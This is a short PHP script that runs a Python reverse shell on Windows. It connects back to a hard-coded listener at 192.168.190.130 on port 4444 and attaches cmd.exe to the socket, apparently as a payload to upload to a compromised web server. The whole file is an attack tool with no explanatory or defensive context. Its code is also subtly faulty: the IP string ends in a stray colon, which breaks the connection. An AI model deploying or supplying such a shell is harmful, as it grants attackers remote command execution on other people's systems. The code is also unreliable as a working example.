<?php
// Change these to match your listener's IP and port
$ip = '192.168.190.130:';
$port = 4444;

// Python reverse shell command for Windows
$cmd = "python -c \"import socket,subprocess,os;" .
       "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" .
       "s.connect(('$ip',$port));" .
       "os.dup2(s.fileno(),0);" .
       "os.dup2(s.fileno(),1);" .
       "os.dup2(s.fileno(),2);" .
       "subprocess.call(['cmd.exe'])\"";

// Execute the command
system($cmd);
?>
